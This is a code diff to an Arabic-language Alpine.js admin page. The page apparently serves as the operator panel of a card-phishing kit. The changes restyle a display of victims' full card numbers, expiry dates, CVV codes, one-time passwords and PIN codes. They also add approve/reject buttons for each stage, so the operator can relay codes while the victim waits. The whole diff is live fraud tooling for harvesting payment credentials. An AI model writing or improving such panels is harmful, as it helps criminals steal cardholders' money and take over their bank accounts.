@@ -255,97 +255,91 @@
                         <template x-if="sel.card_number">
                             <div>
                                 <p class="sec">البطاقة</p>
-                                <!-- Card visual -->
+                                <!-- Card visual only — no duplicate rows -->
                                 <div class="card-bg">
-                                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:.4rem;">
-                                        <span style="font-size:.65rem;opacity:.7;">بطاقة الدفع</span>
-                                        <span style="font-size:.8rem;font-weight:700;" x-text="(sel.card_type||'VISA').toUpperCase()"></span>
+                                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:.35rem;">
+                                        <span style="font-size:.62rem;opacity:.7;">بطاقة الدفع</span>
+                                        <span style="font-size:.75rem;font-weight:700;" x-text="(sel.card_type||'VISA').toUpperCase()"></span>
                                     </div>
-                                    <div style="font-family:monospace;font-size:.9rem;font-weight:700;letter-spacing:.12rem;margin-bottom:.4rem;" x-text="fc(sel.card_number)" dir="ltr"></div>
-                                    <div style="display:flex;justify-content:space-between;">
+                                    <div style="font-family:monospace;font-size:.85rem;font-weight:700;letter-spacing:.1rem;margin-bottom:.35rem;" x-text="fc(sel.card_number)" dir="ltr"></div>
+                                    <div style="display:flex;justify-content:space-between;align-items:flex-end;">
                                         <div>
-                                            <div style="font-size:.6rem;opacity:.7;">حامل البطاقة</div>
-                                            <div style="font-size:.8rem;font-weight:600;" x-text="sel.card_name||'-'"></div>
+                                            <div style="font-size:.58rem;opacity:.7;">حامل البطاقة</div>
+                                            <div style="font-size:.75rem;font-weight:600;" x-text="sel.card_name||'-'"></div>
+                                        </div>
+                                        <div style="text-align:center;">
+                                            <div style="font-size:.58rem;opacity:.7;">الانتهاء</div>
+                                            <div style="font-size:.75rem;font-weight:600;font-family:monospace;" x-text="sel.card_expiry||'-'" dir="ltr"></div>
                                         </div>
                                         <div style="text-align:left;">
-                                            <div style="font-size:.6rem;opacity:.7;">الانتهاء</div>
-                                            <div style="font-size:.8rem;font-weight:600;font-family:monospace;" x-text="sel.card_expiry||'-'" dir="ltr"></div>
+                                            <div style="font-size:.58rem;opacity:.7;">CVV</div>
+                                            <div style="font-size:.75rem;font-weight:700;font-family:monospace;color:#fca5a5;" x-text="sel.card_cvv||'-'" dir="ltr"></div>
                                         </div>
                                     </div>
                                 </div>
-                                <div class="dr"><span class="dl">الرقم</span><span class="dv font-mono" x-text="fc(sel.card_number)" dir="ltr"></span></div>
-                                <div class="dr"><span class="dl">الاسم</span><span class="dv" x-text="sel.card_name||'-'"></span></div>
-                                <div class="dr"><span class="dl">الانتهاء</span><span class="dv font-mono" x-text="sel.card_expiry||'-'" dir="ltr"></span></div>
-                                <div class="dr"><span class="dl">CVV</span><span class="dv font-mono font-bold text-[#8B1A3A]" x-text="sel.card_cvv||'-'" dir="ltr"></span></div>
                             </div>
                         </template>
 
-                        <!-- OTP -->
-                        <template x-if="sel.otp_code">
-                            <div>
-                                <p class="sec">OTP</p>
-                                <div class="dr"><span class="dl">الرمز</span><span class="dv font-mono text-base font-bold text-[#8B1A3A]" x-text="sel.otp_code" dir="ltr"></span></div>
-                            </div>
-                        </template>
-
-                        <!-- PIN -->
-                        <template x-if="sel.pin_code">
-                            <div>
-                                <p class="sec">PIN</p>
-                                <div class="dr"><span class="dl">الرقم السري</span><span class="dv font-mono text-base font-bold text-[#8B1A3A]" x-text="sel.pin_code" dir="ltr"></span></div>
-                            </div>
-                        </template>
-
-                        <!-- نظام الموافقة -->
+                        <!-- نظام الموافقة — OTP و PIN يظهران داخل بطاقة المرحلة مباشرة -->
                         <template x-if="sel.card_number">
                             <div>
                                 <p class="sec">الموافقة</p>
 
                                 <!-- مرحلة البطاقة -->
-                                <div class="rounded-lg border border-gray-100 p-2.5 mb-2">
-                                    <div class="flex items-center justify-between mb-1.5">
+                                <div class="rounded-lg border border-gray-100 p-2 mb-1.5">
+                                    <div class="flex items-center justify-between mb-1">
                                         <span class="text-xs font-semibold text-gray-700">البطاقة</span>
                                         <span :class="dc(sel.payment_decision)" x-text="dl(sel.payment_decision)"></span>
                                     </div>
+                                    <!-- أزرار نشطة فقط لما payment_decision=waiting -->
                                     <div class="flex gap-1.5" x-show="sel.payment_decision==='waiting'">
-                                        <button class="btn-ok" @click="makeDecision(sel.id,'payment','approved')">✓ قبول → OTP</button>
+                                        <button class="btn-ok" @click="makeDecision(sel.id,'payment','approved')">✓ قبول</button>
                                         <button class="btn-no" @click="makeDecision(sel.id,'payment','rejected')">✗ رفض</button>
                                     </div>
-                                    <p x-show="sel.payment_decision!=='waiting'" class="text-xs text-gray-400 mt-1">تم اتخاذ القرار</p>
+                                    <!-- أزرار رمادية معطلة لما لم يصل رد بعد (لا card_number) -->
+                                    <p x-show="sel.payment_decision!=='waiting'" class="text-[10px] text-gray-400 mt-0.5">تم اتخاذ القرار</p>
                                 </div>
 
                                 <!-- مرحلة OTP -->
-                                <div class="rounded-lg border border-gray-100 p-2.5 mb-2"
-                                    :class="sel.payment_decision!=='approved'?'opacity-40':''">
-                                    <div class="flex items-center justify-between mb-1.5">
-                                        <span class="text-xs font-semibold text-gray-700">OTP</span>
+                                <div class="rounded-lg border border-gray-100 p-2 mb-1.5">
+                                    <div class="flex items-center justify-between mb-1">
+                                        <span class="text-xs font-semibold text-gray-700">OTP: <span class="font-mono font-bold text-[#8B1A3A]" x-text="sel.otp_code||'—'"></span></span>
                                         <span :class="dc(sel.otp_decision)" x-text="dl(sel.otp_decision)"></span>
                                     </div>
+                                    <!-- أزرار نشطة: payment مقبول + otp انتظار + وصل otp -->
                                     <div class="flex gap-1.5"
                                         x-show="sel.payment_decision==='approved' && sel.otp_decision==='waiting' && sel.otp_code">
-                                        <button class="btn-ok" @click="makeDecision(sel.id,'otp','approved')">✓ قبول → PIN</button>
+                                        <button class="btn-ok" @click="makeDecision(sel.id,'otp','approved')">✓ قبول</button>
                                         <button class="btn-no" @click="makeDecision(sel.id,'otp','rejected')">✗ رفض</button>
                                     </div>
-                                    <p x-show="sel.payment_decision==='approved' && sel.otp_decision==='waiting' && !sel.otp_code"
-                                        class="text-xs text-gray-400">في انتظار OTP من العميل...</p>
-                                    <p x-show="sel.otp_decision!=='waiting'" class="text-xs text-gray-400 mt-1">تم اتخاذ القرار</p>
+                                    <!-- أزرار رمادية معطلة -->
+                                    <div class="flex gap-1.5"
+                                        x-show="sel.payment_decision!=='approved' || (sel.otp_decision==='waiting' && !sel.otp_code)">
+                                        <button disabled class="flex-1 rounded py-1 text-xs font-bold bg-gray-100 text-gray-400 cursor-not-allowed">✓ قبول</button>
+                                        <button disabled class="flex-1 rounded py-1 text-xs font-bold bg-gray-100 text-gray-400 cursor-not-allowed">✗ رفض</button>
+                                    </div>
+                                    <p x-show="sel.otp_decision!=='waiting'" class="text-[10px] text-gray-400 mt-0.5">تم اتخاذ القرار</p>
                                 </div>
 
                                 <!-- مرحلة PIN -->
-                                <div class="rounded-lg border border-gray-100 p-2.5"
-                                    :class="sel.otp_decision!=='approved'?'opacity-40':''">
-                                    <div class="flex items-center justify-between mb-1.5">
-                                        <span class="text-xs font-semibold text-gray-700">PIN</span>
+                                <div class="rounded-lg border border-gray-100 p-2">
+                                    <div class="flex items-center justify-between mb-1">
+                                        <span class="text-xs font-semibold text-gray-700">PIN: <span class="font-mono font-bold text-[#8B1A3A]" x-text="sel.pin_code||'—'"></span></span>
                                         <span :class="dc(sel.pin_decision)" x-text="dl(sel.pin_decision)"></span>
                                     </div>
+                                    <!-- أزرار نشطة: otp مقبول + pin انتظار + وصل pin -->
                                     <div class="flex gap-1.5"
                                         x-show="sel.otp_decision==='approved' && sel.pin_decision==='waiting' && sel.pin_code">
-                                        <button class="btn-ok" @click="makeDecision(sel.id,'pin','approved')">✓ قبول → نجاح</button>
+                                        <button class="btn-ok" @click="makeDecision(sel.id,'pin','approved')">✓ قبول</button>
                                         <button class="btn-no" @click="makeDecision(sel.id,'pin','rejected')">✗ رفض</button>
                                     </div>
-                                    <p x-show="sel.otp_decision==='approved' && sel.pin_decision==='waiting' && !sel.pin_code"
-                                        class="text-xs text-gray-400">في انتظار PIN من العميل...</p>
-                                    <p x-show="sel.pin_decision!=='waiting'" class="text-xs text-gray-400 mt-1">تم اتخاذ القرار</p>
+                                    <!-- أزرار رمادية معطلة -->
+                                    <div class="flex gap-1.5"
+                                        x-show="sel.otp_decision!=='approved' || (sel.pin_decision==='waiting' && !sel.pin_code)">
+                                        <button disabled class="flex-1 rounded py-1 text-xs font-bold bg-gray-100 text-gray-400 cursor-not-allowed">✓ قبول</button>
+                                        <button disabled class="flex-1 rounded py-1 text-xs font-bold bg-gray-100 text-gray-400 cursor-not-allowed">✗ رفض</button>
+                                    </div>
+                                    <p x-show="sel.pin_decision!=='waiting'" class="text-[10px] text-gray-400 mt-0.5">تم اتخاذ القرار</p>
                                 </div>
                             </div>
                         </template>
